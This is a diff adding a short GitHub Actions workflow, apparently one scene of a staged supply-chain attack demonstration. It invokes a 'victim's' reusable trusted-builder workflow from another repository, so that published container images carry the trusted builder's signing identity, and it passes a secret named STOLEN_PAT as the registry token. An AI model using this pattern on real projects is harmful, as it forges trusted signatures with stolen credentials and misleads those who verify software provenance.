@@ -1,0 +1,22 @@
+# Scene 2b: call the victim's public trusted builder from this repository.
+# Every signature carries the trusted builder identity; only the provenance
+# reveals that the source was this repository.
+name: act2b-borrow-builder
+
+on: workflow_dispatch
+
+permissions: {}
+
+jobs:
+  build:
+    permissions:
+      contents: read
+      packages: write
+      id-token: write
+      attestations: write
+    uses: vuthongkms/trusted-builder/.github/workflows/build-sign-attest.yml@v1
+    with:
+      image: ghcr.io/vuthongkms/demo-app
+      tag: v1-borrowed
+    secrets:
+      registry_token: ${{ secrets.STOLEN_PAT }}
